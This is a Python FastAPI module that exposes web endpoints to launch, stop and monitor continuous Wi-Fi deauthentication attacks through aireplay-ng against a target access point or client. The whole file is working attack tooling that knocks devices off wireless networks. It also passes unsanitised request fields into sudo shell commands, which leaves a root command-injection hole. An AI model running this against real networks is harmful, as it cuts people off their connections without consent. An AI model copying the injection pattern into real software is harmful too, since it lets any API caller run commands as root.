from fastapi import APIRouter, HTTPException
from models.requests import DeauthRequest
import subprocess
import threading
import time
import signal
import os
from typing import Dict
from utils.system import USE_REAL_TOOLS

router = APIRouter()

# Global variables to manage deauth processes
deauth_processes: Dict[str, dict] = {}

class DeauthManager:
    def __init__(self, adapter: str, target_bssid: str, target_mac: str = None):
        self.adapter = adapter
        self.target_bssid = target_bssid
        self.target_mac = target_mac
        self.process = None
        self.thread = None
        self.stop_event = threading.Event()
        self.packets_sent = 0
        self.start_time = None
        
    def start_attack(self):
        """Start deauth attack in background"""
        if self.is_running():
            return False
            
        self.stop_event.clear()
        self.start_time = time.time()
        self.thread = threading.Thread(target=self._attack_worker)
        self.thread.daemon = True
        self.thread.start()
        return True
        
    def stop_attack(self):
        """Stop deauth attack"""
        self.stop_event.set()
        if self.process:
            try:
                # Kill the aireplay-ng process
                self.process.terminate()
                self.process.wait(timeout=5)
            except:
                try:
                    self.process.kill()
                except:
                    pass
        
        # Also kill any remaining aireplay-ng processes for this adapter/target
        subprocess.run(f"sudo pkill -f 'aireplay-ng.*{self.adapter}'", shell=True, capture_output=True)
        
    def is_running(self):
        """Check if attack is currently running"""
        return self.thread and self.thread.is_alive() and not self.stop_event.is_set()
        
    def get_status(self):
        """Get current attack status"""
        return {
            "running": self.is_running(),
            "packets_sent": self.packets_sent,
            "duration": int(time.time() - self.start_time) if self.start_time else 0,
            "target_bssid": self.target_bssid,
            "target_mac": self.target_mac
        }
        
    def _attack_worker(self):
        """Background worker that runs aireplay-ng deauth"""
        try:
            # Build aireplay-ng command
            cmd = f"sudo aireplay-ng --deauth 0 -a {self.target_bssid}"
            if self.target_mac:
                cmd += f" -c {self.target_mac}"
            cmd += f" {self.adapter}"
            
            print(f"Starting deauth attack: {cmd}")
            
            self.process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1,
                preexec_fn=os.setsid
            )
            
            # Monitor output and count packets
            for line in iter(self.process.stdout.readline, ''):
                if self.stop_event.is_set():
                    break
                    
                # Parse aireplay-ng output to count packets
                if "Sending DeAuth" in line or "ACK" in line:
                    self.packets_sent += 1
                    
                print(f"Deauth output: {line.strip()}")
                
        except Exception as e:
            print(f"Error in deauth worker: {e}")
        finally:
            self.stop_attack()

@router.post("/deauth/start")
def start_deauth_attack(request: DeauthRequest):
    """Start continuous deauthentication attack"""
    print(f"DEBUG: Received deauth request - adapter: '{request.adapter}', target_bssid: '{request.target_bssid}', target_mac: '{request.target_mac}'")
    
    if USE_REAL_TOOLS:
        try:
            # Check if adapter is in monitor mode
            check_cmd = f"sudo iwconfig {request.adapter}"
            print(f"DEBUG: Running command: {check_cmd}")
            check_result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
            print(f"DEBUG: iwconfig output: {check_result.stdout}")
            print(f"DEBUG: iwconfig stderr: {check_result.stderr}")
            
            if "Mode:Monitor" not in check_result.stdout:
                raise HTTPException(status_code=400, detail=f"Interface {request.adapter} must be in monitor mode")
            
            # Create unique key for this attack
            attack_key = f"{request.adapter}_{request.target_bssid}"
            if request.target_mac:
                attack_key += f"_{request.target_mac}"
            
            # Check if already attacking this target
            if attack_key in deauth_processes:
                manager = deauth_processes[attack_key]
                if manager.is_running():
                    return {
                        "status": "already_running",
                        "message": f"Deauth attack already running on target {request.target_bssid}",
                        "attack_key": attack_key
                    }
            
            # Start new attack
            manager = DeauthManager(request.adapter, request.target_bssid, request.target_mac)
            if manager.start_attack():
                deauth_processes[attack_key] = manager
                
                target_info = f" -> {request.target_mac}" if request.target_mac else " (broadcast)"
                return {
                    "status": "started",
                    "message": f"Deauth attack started: {request.target_bssid}{target_info}",
                    "attack_key": attack_key,
                    "target_bssid": request.target_bssid,
                    "target_mac": request.target_mac,
                    "adapter": request.adapter
                }
            else:
                raise HTTPException(status_code=500, detail="Failed to start deauth attack")
                
        except HTTPException:
            raise
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Failed to start deauth attack: {str(e)}")
    else:
        # Mock response for development
        target_info = f" -> {request.target_mac}" if request.target_mac else " (broadcast)"
        return {
            "status": "started",
            "message": f"[MOCK] Deauth attack started: {request.target_bssid}{target_info}",
            "attack_key": f"mock_{request.adapter}_{request.target_bssid}",
            "target_bssid": request.target_bssid,
            "target_mac": request.target_mac,
            "adapter": request.adapter
        }

@router.post("/deauth/stop")
def stop_deauth_attack(request: DeauthRequest):
    """Stop deauthentication attack"""
    if USE_REAL_TOOLS:
        try:
            # Create attack key to find the process
            attack_key = f"{request.adapter}_{request.target_bssid}"
            if request.target_mac:
                attack_key += f"_{request.target_mac}"
            
            if attack_key in deauth_processes:
                manager = deauth_processes[attack_key]
                if manager.is_running():
                    manager.stop_attack()
                    
                # Remove from active processes
                del deauth_processes[attack_key]
                
                return {
                    "status": "stopped",
                    "message": f"Deauth attack stopped for {request.target_bssid}",
                    "attack_key": attack_key
                }
            else:
                return {
                    "status": "not_running",
                    "message": f"No active deauth attack found for {request.target_bssid}",
                    "attack_key": attack_key
                }
                
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Failed to stop deauth attack: {str(e)}")
    else:
        # Mock response
        return {
            "status": "stopped",
            "message": f"[MOCK] Deauth attack stopped for {request.target_bssid}",
            "attack_key": f"mock_{request.adapter}_{request.target_bssid}"
        }

@router.get("/deauth/status")
def get_deauth_status():
    """Get status of all running deauth attacks"""
    if USE_REAL_TOOLS:
        status = {}
        for attack_key, manager in deauth_processes.items():
            status[attack_key] = manager.get_status()
        
        return {
            "status": "success",
            "attacks": status,
            "total_attacks": len([k for k, m in deauth_processes.items() if m.is_running()])
        }
    else:
        return {
            "status": "success",
            "attacks": {},
            "total_attacks": 0
        }
